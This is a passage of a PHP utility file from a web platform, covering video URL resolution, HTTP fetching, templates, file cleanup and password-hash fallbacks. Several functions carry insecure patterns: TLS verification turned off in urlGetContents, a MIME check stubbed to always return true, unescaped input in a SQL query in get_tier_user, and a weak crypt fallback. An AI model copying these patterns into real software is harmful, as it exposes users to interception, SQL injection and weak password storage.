    } else {
        $data = $errorResponse;
        $code = explode('site_video:', $urlVideo);
        if (isset($code[1])) {
            global $g;
            $urlVideo = Common::urlSiteSubfolders() . $g['dir_files'] . "video/{$code[1]}.mp4";
            if(url_file_exists($urlVideo)){
                $data = array('url' => $urlVideo,
                              'video_hash' => 'site_video',
                              'type' => 'video/mp4; codecs="avc1.64001F, mp4a.40.2"');
            }
        }
    }
    return $data;
}

function checkCodeYouTubeVideoToDownload_OLD($urlVideo, $format, $urlencode = false, $links = null, $formats = null) {
    $data = array();
    $errorResponse = array('error_code' => 0, 'reason' => '');
    preg_match('/(?:^|\/|v=)([\w\-]{11,11})(?:\?|&|#|$)/', $urlVideo, $сode);
    if (isset($сode[1])) {
        $code = $сode[1];
        if (IS_DEMO && in_array($code, array('oTXCgR93zC8', 'btHXpOHDY9I'))) {
            $data = array('url' => Common::urlSiteSubfolders() . "_tools/demo_city/{$code}.mp4",
                          'video_hash' => 'site_video',
                          'type' => 'video/mp4; codecs="avc1.64001F, mp4a.40.2"');
            return $data;
        }
        if ($formats === null) {
            $formats = array('mp4' => array(37,22,18), 'webm' => array(45,44,43));
        }
        if ($links === null) {
            $links = @urlGetContents('https://www.youtube.com/get_video_info?html5=1&c=TVHTML5&cver=6.20180913&video_id=' . $code . '&el=detailpage');
        }
        if ($links === false) {
            return $errorResponse;
        }
        parse_str($links, $info);

        if (isset($info['status']) && $info['status'] != 'fail') {
            if (isset($info['url_encoded_fmt_stream_map']) && $info['url_encoded_fmt_stream_map']) {
                $prepareVideo = explode(',', $info['url_encoded_fmt_stream_map']);
                foreach ($prepareVideo as $video) {
                    parse_str($video, $params);
                    $videoInfo[$params['itag']] = $params;
                }
                foreach ($formats[$format] as $value) {
                    if (isset($videoInfo[$value]) && url_file_exists($videoInfo[$value]['url'])) {
                        $data = $videoInfo[$value];
                        if ($urlencode) {
                            $data['url'] = urlencode($data['url']);
                        }
                        unset($data['fallback_host']);
                        unset($data['itag']);
                        unset($data['quality']);
                        unset($data['s']);//?????
                        break;
                    }
                }
                if ($data) {
                    $data['video_hash'] = '1';
                }
            }

            if(!$data && isset($info['player_response'])) {
                $player = json_decode($info['player_response'], true);
                if ($player && isset($player['streamingData'])
                        && isset($player['streamingData']['formats'])) {
                    $formatsStream = $player['streamingData']['formats'];

                    $formatsStreamItag = array();
                    foreach ($formatsStream as $key => $row) {
                        if (!isset($row['url'])) {
                            unset($formatsStream[$key]);
                        } elseif (strpos($row['mimeType'], $format) !== false) {
                            $formatsStreamItag[$row['itag']] = $row;
                        }
                    }

                    if ($formatsStreamItag) {
                        foreach ($formats[$format] as $value) {
                            $formatsStreamItagOne = isset($formatsStreamItag[$value]) ? $formatsStreamItag[$value] : false;
                            if ($formatsStreamItagOne
                                    && url_file_exists($formatsStreamItagOne['url'])) {
                                if ($urlencode) {
                                    $data['url'] = urlencode($formatsStreamItagOne['url']);
                                } else {
                                    $data['url'] = $formatsStreamItagOne['url'];
                                }
                                $data['type'] = $formatsStreamItagOne['mimeType'];
                                break;
                            }
                        }
                    }

                    if (!$data && ($formatsStreamItag || $formatsStream)) {
                        $formatsStreamItag = $formatsStreamItag ? $formatsStreamItag : $formatsStream;
                        $formatsStreamItagOne = array_shift($formatsStreamItag);
                        if ($formatsStreamItagOne
                                && url_file_exists($formatsStreamItagOne['url'])) {
                            if ($urlencode) {
                                $data['url'] = urlencode($formatsStreamItagOne['url']);
                            } else {
                                $data['url'] = $formatsStreamItagOne['url'];
                            }
                            $data['type'] = $formatsStreamItagOne['mimeType'];
                        }
                    }
                }
                if ($data) {
                    $data['video_hash'] = '1';
                }
            }
        }
        if (!$data) {
            if (isset($info['errorcode'])) {
                $errorResponse['error_code'] = $info['errorcode'];
            }
            if (isset($info['reason'])) {
                $errorResponse['reason'] = $info['reason'];
            }
            $data = $errorResponse;
        }
    } else {
        $data = $errorResponse;
        $сode = explode('site_video:', $urlVideo);
        if (isset($сode[1])) {
            global $g;
            $urlVideo = Common::urlSiteSubfolders() . $g['dir_files'] . "/video/{$сode[1]}.mp4";
            if(url_file_exists($urlVideo)){
                $data = array('url' => $urlVideo,
                              'video_hash' => 'site_video',
                              'type' => 'video/mp4; codecs="avc1.64001F, mp4a.40.2"');
            }
        }
    }
    return $data;
}

function isValidMimeType($url, $mimeTypes = 'video') {
    /*$isMimeExt = false;
    if (version_compare(PHP_VERSION, '5.3.0', '>=') && extension_loaded('fileinfo')){
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime  = finfo_file($finfo, $url);
        $isMimeExt = true;
    } else {
        if (function_exists('mime_content_type')){
            $mime  = mime_content_type($url);
            $isMimeExt = true;
        }
    }
    if ($isMimeExt && (!$mime || !preg_match('/' . $mimeTypes . '/', $mime))){
        return false;
    }*/
    return true;
}

function censured($msg) {
    global $g;
    $msg = trim($msg);
    if ($msg && Common::isOptionActive('filter')) {
        if (IS_DEMO) {
            $filter = file_get_contents($g['path']['dir_main'] . '_server/im_new/feature/' . 'filter');
            $filter = str_replace("\r", '', $filter);
            $filter = $filter . str_replace('.', ',', $filter);
            $g['deny_words'] = explode("\n", $filter);
        }
        if (isset($g['deny_words']) && $g['deny_words']) {
            $msg = to_profile($msg, '', l('oops'), false);
        }
    }
    return $msg;
}

function urlGetContents($url, $method = 'get', $params = array(), $timeout = 3600, $useHttpBuildQuery = true, $headers = array())
{
    if($useHttpBuildQuery) {
        $params = http_build_query($params);
    }

    if($method === 'get' && $params) {
        if(strpos($url, '?') !== false) {
            $delimiter = '&';
        } else {
            $delimiter = '?';
        }

        $url .= $delimiter . $params;
    }

    if(extension_loaded('curl')) {
        $curl = curl_init();

        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($curl, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        @curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        if($headers) {
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        }

        if($method == 'post') {
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $params);
        }

        $result = curl_exec($curl);
        curl_close($curl);
    } else {
        $options = array(
            'http' => array(
                'timeout' => $timeout,
                ),
            'ssl' => array(
                'verify_peer' => false,
                ),
            );

        if($method == 'post') {
            $options['http']['method'] = 'POST';
            $options['http']['header'] = 'Content-type: application/x-www-form-urlencoded';
            $options['http']['content'] = $params;
            if($headers) {
                $options['http']['header'] = implode("\r\n", $headers);
            }
        }

        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
    }

    return $result;
}

function var_dump_pre($msg, $exit = false)
{
    echo '<pre>';
    var_dump($msg);
    echo '</pre>';

    if($exit) {
        exit;
    }
}

function print_r_pre($msg, $exit = false)
{
    echo '<pre>';
    print_r($msg);
    echo '</pre>';

    if($exit) {
        exit;
    }
}

function pageNotFound()
{
	global $g;

    header('HTTP/1.0 404 Not Found');

	$lNotFound = l('404_not_found');
	$lTitle = l('404_title');
	$lDesc = l('404_desc');
	$lBack = l('404_back_to_homepage');

	$url = Common::urlSite();
	$urlTmpl = $g['path']['url_tmpl'] . 'common';
 	//$cacheVersion = $g['site_cache']['cache_version_param'];

	$urlHomePage = Common::urlSiteSubfolders();
	echo <<<END
	<!DOCTYPE html>
	<html>
		<head>
			<title>$lNotFound</title>
			<base href="$urlHomePage">
			<meta charset="utf-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
			<link  type="text/css" rel="stylesheet" href="$urlTmpl/css/404.css">
			<meta name="robots" content="noindex, follow">
		</head>
		<body>
			<div id="notfound">
			<div class="notfound">
				<div class="notfound-404"></div>
				<h1>404</h1>
				<h2>$lTitle</h2>
				<p>$lDesc</p>
				<a href="$urlHomePage">$lBack</a>
			</div>
			</div>
		</body>
	</html>
END;
	die();
    //die('<center><h1>Not Found</h1><a href="' . Common::urlSiteSubfolders() . '">Home Page</a></center>');
}

function preparePageTemplate($template, $url = null)
{
    if ($url === null) {
        if (Common::isMobile() || get_param('view') == 'mobile') {
            $url = g('tmpl', 'dir_tmpl_mobile');
        } else {
            $url = g('tmpl', 'dir_tmpl_main');
        }
    }
    if (is_array($template)) {
        foreach ($template as $key => $value) {
            $template[$key] = $url . $value;
        }
    } else {
        $template = $url . $template;
    }
    return $template;
}

function getPageCustomTemplate($tmpl, $option, $url = null)
{
    global $p;

    if ($url === null) {
        if (Common::isMobile() || get_param('view') == 'mobile') {
            $url = g('tmpl', 'dir_tmpl_mobile');
        } else {
            $url = g('tmpl', 'dir_tmpl_main');
        }
    }

    if (Common::isOptionActiveTemplate('custom_template_pages')) {
        $customTemplates = Common::getOptionTemplate($option);
        if ($customTemplates) {
            if (TemplateEdge::isTemplateColums() && is_array($customTemplates)
                && !in_array($option, Common::getOptionTemplate('page_no_columns_template'))) {
                $customTemplatesColumns = Common::getOptionTemplate($option . '_columns');
                if (!$customTemplatesColumns) {
                    $customTemplatesColumns = array(
                        'main' => str_replace('.html', '', $customTemplates['main']) . '_columns.html'
                    );
                }
                $customTemplates = array_merge($customTemplates, $customTemplatesColumns, Common::getOptionTemplate('columns_template'));
            }
            $tmpl = $customTemplates;
        } elseif ($tmpl === null)  {
            return null;
        }
    } elseif ($tmpl === null)  {
        return null;
    }

    return preparePageTemplate($tmpl, $url);
}

function mergeCustomTemplate(&$listTmpl, $option, $url = null)
{
    if ($url === null) {
        $url = g('tmpl', 'dir_tmpl_main');
    }

    $customTemplates = Common::getOptionTemplate($option);
    if ($customTemplates) {
        $customTemplates = preparePageTemplate($customTemplates, $url);
        $listTmpl = array_merge($listTmpl, $customTemplates);
    }
}

function getAge($birthday) {
  $timestamp = strtotime($birthday);
  $age = date('Y') - date('Y', $timestamp);
  if (date('md', $timestamp) > date('md')) {
    $age--;
  }
  return $age;
}

function stopScript($text = null)
{
    if($text !== null) {
        echo ($text);
    }

    DB::close();

    die();
}

function getResponsePageAjaxByAuthStop(&$page, $isAuth = null){
    if ($isAuth === null) {
        $isAuth = guid();
    }
    stopScript(getResponsePageAjaxByAuth($isAuth, $page));
}

function getMobileOnPageSearch(){
    $onPage = intval(Common::getOption('usersinfo_per_page', 'template_options'));
    $mOnPage = intval(Common::getOption('number_of_profiles_in_the_search_results'));
    if ($mOnPage) {
        $onPage = $mOnPage;
    }
    $cookieOnPage = intval(get_cookie('on_page', 1));
    if ($cookieOnPage) {
        $onPage = $cookieOnPage;
    }
    if (!$onPage) {
        $onPage = 20;
    }
    return $onPage;
}

// Fix for open_basedir
function copyUrlToFile($from, $to) {

    $result = false;

    if(ini_get('open_basedir') || !ini_get('allow_url_fopen')) {

        if(strpos($from, '://') !== false || strpos($from, '//') === 0) {
            $data = urlGetContents($from);
        } else {
            $data = file_get_contents($from);
        }

        if($data) {
            $result = file_put_contents($to, $data);
        }

    } else {
        $result = copy($from, $to);
    }

    return $result !== false;
}

function array_splice_assoc($input, $key,  $replacement, $length = 1) {
        $replacement = (array) $replacement;
        $key_indices = array_flip(array_keys($input));
        if (isset($input[$key]) && is_string($key)) {
            $key = $key_indices[$key];
        }
        if (isset($input[$length]) && is_string($length)) {
            $length = $key_indices[$length] - $key;
        }

        $input = array_slice($input, 0, $key, true)
                + $replacement
                + array_slice($input, $key + $length, null, true);

        return $input;
}

function prepareOpacityValue($value) {
    $value = intval(substr(trim($value), 0, 3));
    if($value > 100) {
        $value = 100;
    } elseif ($value < 0) {
        $value = 0;
    }

    $value = $value / 100;

    return $value;
}

function getHex2Rgba($hex, $opacity = 1) {
    $rgba = implode(',', hex2rgb($hex)) . ',' . prepareOpacityValue($opacity);
    return 'rgba(' . $rgba . ')';
}

/*
 * @param $value
 * @result int/false
 */
function prepare_int($value){
    $intValue = intval($value);
    if ($intValue && $value === strval($intValue)){
        return $intValue;
    }
    return NULL;
}

/*
 * @param string $data "1,2,3,4"
 * @result string
 */
function to_sql_array_int($data, $strict = true){

    $results = '';
    $data = strval($data);

    if (!$data) {
        return $results;
    }

    $data = explode(',', $data);
    if (is_array($data) && $data) {
        foreach ($data as $key => $value) {
            $value = prepare_int($value);
            if ($value === NULL){
                if ($strict) {
                    $data = array();
                    break;
                }
                unset($data[$key]);
            }
        }
        if ($data) {
            $results = implode(',', $data);
        }
    }

    return to_sql($results, 'Plain');
}

function jsonDecodeParamArray($param = null, $data = null)
{
    if ($data === null && $param !== null) {
        $data = get_param($param);
    }
    if (is_string($data)) {
        $data = json_decode($data, true);
    }
    if (!is_array($data)) {
        $data = array();
    }
    return $data;
}

function getRand($counter = 0)
{
    $rand = ((guid() . time()) + mt_rand(0,100000));
    if ($counter) {
        $rand .= $counter;
    }
    return  $rand;
}

function get_magic_quotes_gpc_compatible()
{
    global $g;

    if(PHP_MAJOR_VERSION >= 7) {
        $result = false;
    } else {
        $result = get_magic_quotes_gpc();
    }

    return $result;
}

/* Added by Divyesh - 11-10-2023 */
function get_tier_user($tier){
    $tier_1_users = DB::all("SELECT u.user_id, COUNT(st.id) AS tickets
    FROM user as u
    LEFT JOIN support_tickets as st ON u.user_id = st.assign_to 
    where u.support_tier='{$tier}'
    GROUP BY u.user_id");

    $user_array = array();

    foreach ($tier_1_users as $user){
        $user_array[$user['user_id']] = $user['tickets'];
    }

    if (count($user_array) == 0){
        $user_array[1] = 0;
    }
    
    $minValue = min($user_array);  // Get the minimum value from the array
    $keysWithMinValue = array_keys($user_array, $minValue);  // Get keys with the minimum value

    // Get the minimum value in the array
    $minValue = min($user_array);

    // Get all keys that have the minimum value
    $minKeys = array_keys($user_array, $minValue);

    // If there is more than one key with the minimum value, select randomly
    if (count($minKeys) > 1) {
        $randomKey = $minKeys[array_rand($minKeys)];
        return $randomKey;
    }

    // If there is only one key with the minimum value, return it
    return $minKeys[0];
}

function bigFileSize($file) {

    $filesize = 0;

    if (PHP_INT_MAX > 2147483647) {
        $filesize = filesize($file);
    } else {
        $handle = fopen($file, 'rb');

        if ($handle) {
            $buffer = '';
            $chunkSize = 1024 * 1024;

            while (!feof($handle)) {
                $buffer = fread($handle, $chunkSize);
                if ($buffer !== false) {
                  $filesize += strlen($buffer);
                }
            }

            fclose($handle);
        }
    }

    return $filesize;
}

function clearOldFiles($dir, $condition = '', $expireTime = null){
    if (!is_dir($dir)) {
        return;
    }
    if ($expireTime === null) {
        $expireTime = 24*3600;
    }
    if ($dh = opendir($dir)) {
        $time = time();
        while (($file = readdir($dh)) !== false) {
            $unlinkFile = $dir . $file;
            if (is_file($unlinkFile)){
                $check = true;
                if ($condition && stripos($file, $condition) === false) {
                    $check = false;
                }
                $timeFile = custom_filemtime($unlinkFile);
                if ($check && ($time - $timeFile) > $expireTime) {
                    //echo $unlinkFile . '<br>';
                    @unlink($unlinkFile);
                }
            }
        }
        closedir($dh);
    }
}

function clearOldFilesSite(){
    global $g;

	$dirTemp = $g['path']['dir_files'] . 'temp/';
    $dirs = array(
        array($g['path']['dir_files'] . 'music/tmp/', 'mp3'),
		array($dirTemp, 'tmp_wall_'),
		array($dirTemp, 'face_city_'),
		array($dirTemp, 'tmp_join_impact_'),
		array($dirTemp, 'tmp_cover_'),
		array($dirTemp, 'tmp_chat_')
    );
    foreach ($dirs as $item) {
        clearOldFiles($item[0], isset($item[1]) ? $item[1] : '');//, 100
    }
}

function error_to_log($message)
{
    global $g;
    $clientErrorOffSrc = isset($g['client_error_off']) ? $g['client_error_off'] : null;

    $g['client_error_off'] = true;

    trigger_error($message);

    $g['client_error_off'] = $clientErrorOffSrc;
}

if(!function_exists('password_hash')) {
    if(!defined('PASSWORD_DEFAULT')) {
        define('PASSWORD_DEFAULT', 1);
    }
    function password_hash($password, $algo, $options = array()) {

        $salt = hash_generate(22, "./1234567890abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

        if (CRYPT_BLOWFISH == 1) {
            $salt = '$2y$10$' . $salt;
        } else {
            $salt = '$1$' . $salt;
        }

        $hash = crypt($password, $salt);

        return $hash;
    }
}


if(!function_exists('password_verify')) {
    function password_verify($password, $hash) {
        $result = crypt($password, $hash);
        return $result === $hash;
    }
}

function isEmojiInText($string)
{
    $regex =
        '/[\x{0080}-\x{02AF}'
        .'\x{0300}-\x{03FF}'
        .'\x{0600}-\x{06FF}'
        .'\x{0C00}-\x{0C7F}'
        .'\x{1DC0}-\x{1DFF}'
        .'\x{1E00}-\x{1EFF}'
        .'\x{2000}-\x{209F}'
        .'\x{20D0}-\x{214F}'
        .'\x{2190}-\x{23FF}'
        .'\x{2460}-\x{25FF}'
        .'\x{2600}-\x{27EF}'
        .'\x{2900}-\x{29FF}'
        .'\x{2B00}-\x{2BFF}'
        .'\x{2C60}-\x{2C7F}'
        .'\x{2E00}-\x{2E7F}'
        .'\x{3000}-\x{303F}'
        .'\x{A490}-\x{A4CF}'
        .'\x{E000}-\x{F8FF}'
        .'\x{FE00}-\x{FE0F}'
        .'\x{FE30}-\x{FE4F}'
        .'\x{1F000}-\x{1F02F}'
        .'\x{1F0A0}-\x{1F0FF}'
        .'\x{1F100}-\x{1F64F}'
        .'\x{1F680}-\x{1F6FF}'
        .'\x{1F910}-\x{1F96B}'
        .'\x{1F980}-\x{1F9E0}]/u';
    return preg_match($regex, $string);
}